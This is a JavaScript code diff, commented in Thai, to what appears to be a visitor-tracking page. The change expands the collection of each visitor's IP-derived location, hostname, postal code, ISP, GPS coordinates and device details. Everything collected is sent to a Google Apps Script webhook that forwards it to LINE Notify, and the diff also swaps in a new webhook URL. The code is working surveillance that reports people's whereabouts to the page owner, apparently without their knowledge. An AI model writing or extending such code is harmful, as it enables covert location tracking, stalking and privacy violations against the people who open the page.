@@ -216,34 +216,42 @@ function detectBrowser() {
   return `${browserName} ${browserVersion}`;
 }
 
-// ฟังก์ชันดึงข้อมูล IP โดยละเอียด
+// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
 async function getIPDetails() {
   try {
-    // ดึงข้อมูล IP พื้นฐาน
-    const basicResponse = await fetch('https://api.ipify.org?format=json');
-    const basicData = await basicResponse.json();
-    const ip = basicData.ip;
-
-    try {
-      // ดึงข้อมูลเพิ่มเติมจาก ipapi.co (ฟรี ไม่ต้องใช้ API key)
-      const detailResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-      const ipDetails = await detailResponse.json();
-
-      return {
-        ip: ip,
-        city: ipDetails.city || "ไม่ทราบ",
-        region: ipDetails.region || "ไม่ทราบ",
-        country: ipDetails.country_name || "ไม่ทราบ",
-        isp: ipDetails.org || "ไม่ทราบ",
-        timezone: ipDetails.timezone || "ไม่ทราบ"
-      };
-    } catch (detailError) {
-      // หากไม่สามารถดึงข้อมูลเพิ่มเติมได้ ใช้แค่ IP พื้นฐาน
-      return { ip: ip };
+    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว (ฟรี ไม่ต้องใช้ API key, มี rate limit)
+    const response = await fetch('https://ipinfo.io/json');
+    if (!response.ok) {
+      throw new Error(`ipinfo.io request failed with status ${response.status}`);
     }
+    const ipDetails = await response.json();
+
+    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
+    return {
+      ip: ipDetails.ip || "ไม่สามารถระบุได้",
+      hostname: ipDetails.hostname || "ไม่มีข้อมูล", // เพิ่ม hostname
+      city: ipDetails.city || "ไม่ทราบ",
+      region: ipDetails.region || "ไม่ทราบ",
+      country: ipDetails.country || "ไม่ทราบ", // ipinfo ใช้ 'country' code (e.g., TH)
+      loc: ipDetails.loc || "ไม่มีข้อมูล", // พิกัด lat,long จาก IP
+      org: ipDetails.org || "ไม่ทราบ", // องค์กร/ISP (ASN + Name)
+      postal: ipDetails.postal || "ไม่มีข้อมูล", // รหัสไปรษณีย์
+      timezone: ipDetails.timezone || "ไม่ทราบ",
+      // แยก ASN และ ISP/Org name ถ้าเป็นไปได้
+      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
+      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
+    };
   } catch (error) {
-    console.error("ไม่สามารถดึง IP ได้:", error);
-    return { ip: "ไม่สามารถระบุได้" };
+    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
+    // ลองใช้ fallback (ipify) หาก ipinfo ล้มเหลว
+    try {
+      const basicResponse = await fetch('https://api.ipify.org?format=json');
+      const basicData = await basicResponse.json();
+      return { ip: basicData.ip || "ไม่สามารถระบุได้" }; // คืนค่า IP พื้นฐาน
+    } catch (fallbackError) {
+      console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
+      return { ip: "ไม่สามารถระบุได้" };
+    }
   }
 }
 
@@ -355,19 +363,33 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
     `⏰เวลา: ${timestamp}`,
   ];
 
-  // ข้อมูล IP
+  // --- ข้อมูล IP ละเอียด ---
   message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
-
+  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
+    message.push(`   - Hostname: ${ipData.hostname}`);
+  }
   if (ipData.city && ipData.country) {
-    message.push(`📍ตำแหน่งจาก IP: ${ipData.city}, ${ipData.region}, ${ipData.country}`);
+    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
+    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
   }
-
-  if (ipData.isp) {
-    message.push(`🔌เครือข่าย: ${ipData.isp}`);
+  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
+    message.push(`   - พิกัด (IP): ${ipData.loc}`);
   }
+  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
+    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
+  }
+  if (ipData.org && ipData.org !== "ไม่ทราบ") {
+    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
+  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
+    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
+  }
+  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
+    message.push(`   - Timezone: ${ipData.timezone}`);
+  }
+  // --- จบข้อมูล IP ---
 
-  // ข้อมูลพิกัด GPS
-  if (location && location.lat && location.long) {
+  // ข้อมูลพิกัด GPS (ถ้ามี)
+  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
     message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
     message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
   } else {
@@ -417,7 +439,7 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
   const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo);
 
   // ส่งข้อมูลไปยัง webhook ของเรา (ที่ต่อกับ LINE Notify)
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbz-hszJoXrCoT8MBFJ2j7gAWdhXg0evpe24g690_Wb9BdaSKmtp1fOWpEeae7X8Agdr_w/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwXkflttKr0oJAajqxO9Xhx8qIgBBQfHN_REF9mXaVFASJpaoHzHAB2f_AO86Sxh0iMeA/exec';
 
   // เตรียมข้อมูลสำหรับส่ง
   const dataToSend = {
